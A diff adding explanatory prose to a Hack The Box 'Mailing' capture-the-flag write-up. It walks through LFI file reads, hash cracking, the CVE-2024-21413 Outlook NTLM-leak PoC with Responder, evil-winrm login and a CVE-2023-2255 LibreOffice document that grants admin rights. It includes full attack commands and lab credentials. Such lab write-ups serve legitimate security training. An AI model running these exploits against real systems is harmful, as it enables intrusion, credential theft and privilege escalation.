@@ -4,14 +4,16 @@ banner: /avatars/mailing.webp
 difficulty: easy
 os: windows
 releaseDate: 2024-05-04
-pwnDate: 2024-05-00
+pwnDate: 2024-05-08
 slug: "mailing"
-achievement: 
+achievement: https://www.hackthebox.com/achievement/machine/701907/600
 ---
 
 import Browser from "@/components/Browser.astro" 
 
 ## Enumeration
+
+As always, we will start by performing a scan of the machine with nmap. [(command explanation)](https://explainshell.com/explain?cmd=nmap+-p-+--open+-sS+--min-rate+5000+-vvv+-n+-Pn+--disable-arp-ping+10.10.11.14+-oG+allPorts)
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.14 -oG allPorts
@@ -38,6 +40,10 @@ PORT      STATE SERVICE      REASON
 49668/tcp open  unknown      syn-ack ttl 127
 59433/tcp open  unknown      syn-ack ttl 127
 ```
+
+then, with the extractPorts tool that can be found [here](https://gist.github.com/anibalardid/5e05b6472feb3d31116729dc24e6d3e2?permalink_comment_id=4979896#gistcomment-4979896), 
+we can copy and paste the ports into the next nmap scan so that we only focus on these ports to perform the scan faster with the default scripts and get the version of the services that run on it. 
+
 
 ```bash
 sudo nmap -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,59433 -sCV 10.10.11.14 -oN targeted
@@ -101,6 +107,8 @@ Host script results:
 |_  start_date: N/A
 ```
 
+if we try to access the web service, we can see that the machine is using virtual hosting so I add the following entry to the hosts file
+
 ```bash
 sudo echo "10.10.11.14 mailing.htb" >> /etc/hosts
 ```
@@ -115,6 +123,8 @@ sudo echo "10.10.11.14 mailing.htb" >> /etc/hosts
 | Ruy Alonso | IT Team |
 | Maya Bendito | Support Team |
 | Gregory Smith | Founder and CEO |
+
+after examining the website and getting some staff members, we fuzzed the website to see if we could find out anything else but it doesn't seem to be the way to go.
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://mailing.htb/FUZZ"
@@ -147,6 +157,8 @@ instructions            [Status: 301, Size: 165, Words: 9, Lines: 2]
 
 ## Foothold
 
+When you put the cursor over the button to download the instructions, the following link appears: "http://mailing.htb/download.php?file=instructions.pdf" and to check if it is vulnerable to IF we do a little fuzzing to make sure.
+
 ```bash
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt -u "http://mailing.htb/download.php?file=FUZZ" -fs 15
 
@@ -176,6 +188,8 @@ C:..\..\..\..\..\..\Windows\system32\drivers\etc\hosts [Status: 200, Size: 849, 
 RANDOMDIR../../../../Windows/system32/drivers/etc/hosts [Status: 200, Size: 849, Words: 172, Lines: 24]
 :: Progress: [215/215] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
 ```
+
+after visiting some of the links, the site does seem to be vulnerable to this vulnerability, so we started looking for the configuration files for hMailServer
 
 ```
 # Copyright (c) 1993-2009 Microsoft Corp.
@@ -234,14 +248,16 @@ Database=hMailServer
 Internal=1
 ```
 
-https://crackstation.net/
+after obtaining this information, we proceeded to crack the hashes using [crackstation](https://crackstation.net/) and hashcat, reaching the following results
 
 | Hash | Type | Result |
 | ---- | ---- | ------ | 
 | 841bb5acfa6779ae432fd7a4e6600ba7 | md5 | homenetworkingadministrator | 
-| 0a9f8ad8bf896b501dde74f08efd7e4c | Unknown | Not found. | 
+| 0a9f8ad8bf896b501dde74f08efd7e4c | Unknown | Not found. |
 
-https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/tree/main
+once we have obtained the credential or password of the mail server, we can try to get the ntlmv2 hash using the following [POC](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/tree/main) and the [Responder](https://github.com/SpiderLabs/Responder) tool
+
+first of all, we set our listener and then we send the mail with the python script we have downloaded
 
 ```bash
 python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url 10.10.11.14 --subject exploit
@@ -251,8 +267,6 @@ Alexander Hagenah / @xaitax / ah@primepage.de
 
 ✅ Email sent successfully.
 ```
-
-https://github.com/lgandx/Responder
 
 ```bash
 sudo responder -I tun0
@@ -338,6 +352,8 @@ sudo responder -I tun0
 [*] Skipping previously captured hash for MAILING\maya
 ```
 
+next, once we receive our NTLMv2 hash, we save it into a file, try to find out the mode that corresponds to it in hashcat and proceed to crack it.
+
 ```
 maya::MAILING:d3960134b3f9567d:472162304C11627880D634C11E417411:01010000000000008020ED6355A0DA01C35301F11A9E2AE8000000000200080055005A0054005A0001001E00570049004E002D003100500041005700450031004E004C0034005300480004003400570049004E002D003100500041005700450031004E004C003400530048002E0055005A0054005A002E004C004F00430041004C000300140055005A0054005A002E004C004F00430041004C000500140055005A0054005A002E004C004F00430041004C00070008008020ED6355A0DA01060004000200000008003000300000000000000000000000002000006D7721DC72BAE0F10CA72A04A239BC3CEF045EFEFA402220D04537F4541BF2D10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0037000000000000000000
 ```
@@ -364,7 +380,9 @@ hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
 MAYA::MAILING:d3960134b3f9567d:472162304c11627880d634c11e417411:01010000000000008020ed6355a0da01c35301f11a9e2ae8000000000200080055005a0054005a0001001e00570049004e002d003100500041005700450031004e004c0034005300480004003400570049004e002d003100500041005700450031004e004c003400530048002e0055005a0054005a002e004c004f00430041004c000300140055005a0054005a002e004c004f00430041004c000500140055005a0054005a002e004c004f00430041004c00070008008020ed6355a0da01060004000200000008003000300000000000000000000000002000006d7721dc72bae0f10ca72a04a239bc3cef045efefa402220d04537f4541bf2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000:m4y4ngs4ri
 ```
 
-`maya:m4y4ngs4ri`
+Once cracked, we obtain the following credentials: `maya:m4y4ngs4ri`
+
+Using the [evil-winrm](https://github.com/Hackplayers/evil-winrm) tool, we connect to the machine with the credentials obtained and get the user flag
 
 ```bash
 evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
@@ -394,6 +412,21 @@ e6ab9fac675d9f2d2db0f0de49d3b2e0
 ```
 
 ## Privilege Escalation
+
+For privilege escalation we start by listing the users that exist, our user information, what groups exist, etc.
+
+We can see that there are 2 users that seem to have superuser permissions “Administrator” and “localadmin” and we can also see that there is a group Administrators to which maya does not belong.
+
+```bash
+*Evil-WinRM* PS C:\Users\maya\Documents> net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrador            DefaultAccount           Invitado
+localadmin               maya                     WDAGUtilityAccount
+The command completed with one or more errors.
+```
 
 ```bash
 *Evil-WinRM* PS C:\Users\maya\Documents> net user maya
@@ -426,17 +459,6 @@ The command completed successfully.
 ```
 
 ```bash
-*Evil-WinRM* PS C:\Users\maya\Documents> net user
-
-User accounts for \\
-
--------------------------------------------------------------------------------
-Administrador            DefaultAccount           Invitado
-localadmin               maya                     WDAGUtilityAccount
-The command completed with one or more errors.
-```
-
-```bash
 *Evil-WinRM* PS C:\Users\maya\Documents>net localgroup
 
 Aliases for \\MAILING
@@ -448,7 +470,7 @@ Aliases for \\MAILING
 *IIS_IUSRS
 *Invitados
 *Lectores del registro de eventos
-*Operadores criptogr ficos
+*Operadores criptogr ficos
 *Operadores de asistencia de control de acceso
 *Operadores de configuraci¢n de red
 *Operadores de copia de seguridad
@@ -462,4 +484,193 @@ Aliases for \\MAILING
 *Usuarios del monitor de sistema
 *Usuarios del registro de rendimiento
 The command completed successfully.
+```
+
+we then proceed to list the scheduled tasks to see if we find anything that stands out and we find the following
+
+```bash
+*Evil-WinRM* PS C:\Users\maya\Documents> schtasks
+
+Folder: \
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Mail                                     N/A                    Disabled
+MailPython                               N/A                    Running
+Test                                     N/A                    Ready
+<...SNIP...>
+```
+
+here we can better see the details of the Test task (which is the one that is important to us)
+
+```
+HostName:                             MAILING
+TaskName:                             \Test
+Next Run Time:                        N/A
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        2024-05-08 3:18:45 PM
+Last Result:                          0
+Author:                               MAILING\maya
+Task To Run:                          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\Users\localadmin\Documents\scripts\soffice.ps1
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode
+Run As User:                          localadmin
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: Disabled
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At logon time
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
+```
+
+Doing some research on the machine, we find these things that catch my interest, the directory `C:/Important Documents` and that **LibreOffice** is installed can be seen in `C:/Program Files`.
+if we open the file `C:\Program Files\LibreOffice\readmes\readme_es.txt`, we find out that the installed version of libreoffice is 7.4 [CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255)
+
+To exploit this vulnerability, we make use of this [poc](https://github.com/elweth-sec/CVE-2023-2255) from github. we download the script and create our payload "exploit.odt" as indicated in the description of the poc.
+
+```bash
+python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
+```
+
+```bash
+python3 -m http.server 80
+```
+
+once we have our exploit, we upload it to the `C:\Important Documents` folder and wait for the localadmin user to run it automatically with the task test. Close the Evil-WinRM session once executed and log in again.
+
+```bash
+*Evil-WinRM* PS C:\Important Documents> wget http://10.10.14.7/exploit.odt -o exploit.odt
+*Evil-WinRM* PS C:\Important Documents> ls
+
+    Directory: C:\Important Documents
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          5/8/2024   4:29 PM          30526 exploit.odt
+*Evil-WinRM* PS C:\Important Documents> ls
+```
+
+now we can see how the user maya belongs to the "Administradores" group being able to access the flag root
+
+```bash
+*Evil-WinRM* PS C:\Important Documents> net user maya
+User name                    maya
+Full Name
+Comment
+User s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2024-04-12 4:16:20 AM
+Password expires             Never
+Password changeable          2024-04-12 4:16:20 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2024-05-08 4:31:21 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administradores      *Remote Management Use
+                             *Usuarios             *Usuarios de escritori
+Global Group memberships     *Ninguno
+The command completed successfully.
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\maya\Documents> cat C:\Users\localadmin\Desktop\root.txt
+19c60abfa5edc58388a401ccc8bac673
+```
+
+## Appendices
+
+| Resource access level | |
+| ------ | ----------------- |
+| `(CI)` | container inherit |
+| `(OI)` | object inherit |
+| `(IO)` | inherit only |
+| `(NP)` | do not propagate inherit |
+| `(I)`  | permission inherited from parent container | 
+
+
+| Basic access permissions ||
+| ---- | ------------|
+| `F`  | full access |
+| `D`  | delete access |
+| `N`  | no access |
+| `M`  | modify access |
+| `RX` | read and execute access |
+| `R`  | read-only access |
+| `W`  | write-only access |
+
+---
+
+Permissions of the "C:\Important Documents" folder
+
+```bash
+icacls "C:\Important Documents"
+
+MAILING\maya:(OI)(CI)(M)
+BUILTIN\Administradores:(I)(OI)(CI)(F)
+NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+BUILTIN\Usuarios:(I)(OI)(CI)(RX)
+NT AUTHORITY\Usuarios autentificados:(I)(M)
+NT AUTHORITY\Usuarios autentificados:(I)(OI)(CI)(IO)(M)
+```
+
+If we notice that the administrators group, to which “localadmin” belongs, has full permissions `(F)`, there is a possibility that “localadmin” can access the files we place in that folder. We can verify this by placing any file in the folder, as “maya” has modify permissions `(M)`, which allows her to write into it. After a minute, the file will be retrieved and the folder will be empty.
+
+Permissions of the "C:\Users\localadmin\Documents\scripts\soffice.ps1" script
+
+```bash
+icacls C:\Users\localadmin\Documents\scripts\soffice.ps1
+
+NT AUTHORITY\SYSTEM:(I)(F)
+MAILING\localadmin:(I)(F)
+BUILTIN\Administradores:(I)(F)
+```
+
+Contents of the "C:\Users\localadmin\Documents\scripts\soffice.ps1" script containing the logic of the Test task
+
+```ps1
+# Define the directory containing the .odt files
+$directory = "C:\Important Documents\"
+
+# Get all .odt files in the directory
+$odtFiles = Get-ChildItem -Path $directory -Filter *.odt
+
+# Loop through each .odt file
+foreach ($file in $odtFiles) {
+    # Start LibreOffice and open the current .odt file
+    $fileName = $file.FullName
+    Start-Process "C:\Program Files\LibreOffice\program\soffice.exe" -ArgumentList "--headless --view --norestore", "`"$fileName`""
+
+    # Wait for LibreOffice to fully open the document
+    Start-Sleep -Seconds 5  # Adjust the delay as needed
+
+    # Wait for the document to close
+    Start-Sleep -Seconds 5  # Adjust the delay as needed
+
+    Stop-Process -Name "soffice" -force
+
+    # Delete the .odt file
+    Remove-Item -Path $file.FullName -Force
+}
+
+Remove-Item 'C:\Important Documents\*' -Recurse -Force
 ```
